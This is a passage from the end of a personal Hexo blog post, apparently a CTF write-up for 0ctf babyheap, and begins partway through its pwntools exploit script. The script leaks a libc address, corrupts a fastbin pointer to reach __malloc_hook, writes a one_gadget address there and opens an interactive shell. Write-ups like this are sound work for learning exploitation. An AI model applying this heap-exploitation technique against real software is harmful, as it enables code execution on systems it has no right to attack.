class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> -<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">one = <span class="number">0x4526a</span> + libc_addr</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#4       *2,4 -&gt; 2  </span></span><br><span class="line">free(<span class="number">4</span>) </span><br><span class="line">fill(<span class="number">2</span>,<span class="number">8</span>,p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+libc_addr-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#4   </span></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>)+p64(one)</span><br><span class="line">fill(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/444d8fc0/18.PNG" alt="18"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://s4ndw1ch136.github.io">s4ndw1ch</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://s4ndw1ch136.github.io/post/444d8fc0.html">http://s4ndw1ch136.github.io/post/444d8fc0.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%84%9F%E6%82%9F/">感悟</a></div><div class="post_share"><div class="social-share" data-image="/img/wallhaven-9mjoy1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/271734e2.html" title="orw_heap"><img class="cover" src="/img/orw.PNG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">orw_heap</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s4ndw1ch</div><div class="author-info__description">The closer you get  The less you see</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/s4ndw1ch136"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">VX:s4ndw1ch_vx</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#100days-0ctf-babyheap"><span class="toc-number">1.</span> <span class="toc-text">100days_0ctf_babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%8D%E6%8E%A20ctf-babyheap"><span class="toc-number">1.2.</span> <span class="toc-text">再探0ctf_babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text">检查保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">本地调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.3.</span> <span class="toc-text">IDA静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">add():</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fill"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">fill():</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#free"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">free():</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86"><span class="toc-number">1.2.4.</span> <span class="toc-text">思路整理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E9%83%A8exp"><span class="toc-number">1.2.5.</span> <span class="toc-text">全部exp:</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/444d8fc0.html" title="100days_0ctf_babyheap"><img src="/img/wallhaven-9mjoy1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="100days_0ctf_babyheap"/></a><div class="content"><a class="title" href="/post/444d8fc0.html" title="100days_0ctf_babyheap">100days_0ctf_babyheap</a><time datetime="2023-08-31T12:59:51.000Z" title="Created 2023-08-31 20:59:51">2023-08-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/271734e2.html" title="orw_heap"><img src="/img/orw.PNG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="orw_heap"/></a><div class="content"><a class="title" href="/post/271734e2.html" title="orw_heap">orw_heap</a><time datetime="2023-08-24T09:12:46.000Z" title="Created 2023-08-24 17:12:46">2023-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/f4d8b088.html" title="orw_incomplete"><img src="/img/orw.PNG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="orw_incomplete"/></a><div class="content"><a class="title" href="/post/f4d8b088.html" title="orw_incomplete">orw_incomplete</a><time datetime="2023-08-24T07:08:04.000Z" title="Created 2023-08-24 15:08:04">2023-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d83b14c6.html" title="orw_stack"><img src="/img/orw.PNG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="orw_stack"/></a><div class="content"><a class="title" href="/post/d83b14c6.html" title="orw_stack">orw_stack</a><time datetime="2023-08-24T03:26:34.000Z" title="Created 2023-08-24 11:26:34">2023-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/96d9ba0c.html" title="hitb2017_1000levels(利用vsyscall滑动Bypass PIE)"><img src="/img/wallhaven-jx1dmq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hitb2017_1000levels(利用vsyscall滑动Bypass PIE)"/></a><div class="content"><a class="title" href="/post/96d9ba0c.html" title="hitb2017_1000levels(利用vsyscall滑动Bypass PIE)">hitb2017_1000levels(利用vsyscall滑动Bypass PIE)</a><time datetime="2023-08-21T05:31:17.000Z" title="Created 2023-08-21 13:31:17">2023-08-21</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/wallhaven-9mjoy1.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By s4ndw1ch</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo" title=""><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题使用Butterfly" title=""><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime.js"></script><!-- hexo injector body_end end --></body></html>
